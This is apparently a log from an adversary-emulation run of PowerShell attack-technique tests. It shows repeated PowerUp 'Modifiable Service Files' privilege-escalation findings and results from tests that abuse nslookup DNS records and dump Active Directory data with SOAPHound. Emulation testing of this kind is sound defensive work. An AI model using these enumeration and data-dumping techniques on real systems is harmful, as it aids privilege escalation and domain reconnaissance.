+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files                                                                                                                                       Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Modifiable Service Files
+Exit code: -1
+Done executing test: T1059.001-19 PowerUp Invoke-AllChecks
+Executing test: T1059.001-20 Abuse Nslookup with DNS Records
+desktop-0r0eq17\qween
+Non-authoritative answer:
+Exit code: 0
+Done executing test: T1059.001-20 Abuse Nslookup with DNS Records
+Executing test: T1059.001-21 SOAPHound - Dump BloodHound Data
+User must be in the format domain\user or user@domain
+File: c:\temp\cache.txt does not exist. Generate cache before executing this command.
+Exit code: 0
+Done executing test: T1059.001-21 SOAPHound - Dump BloodHound Data
+Executing test: T1059.001-22 SOAPHound - Build Cache
+User must be in the format domain\user or user@domain
+Domain is missing and could not be determined automatically, use --domain.
+Exit code: 0
+Done executing test: T1059.001-22 SOAPHound - Build Cache
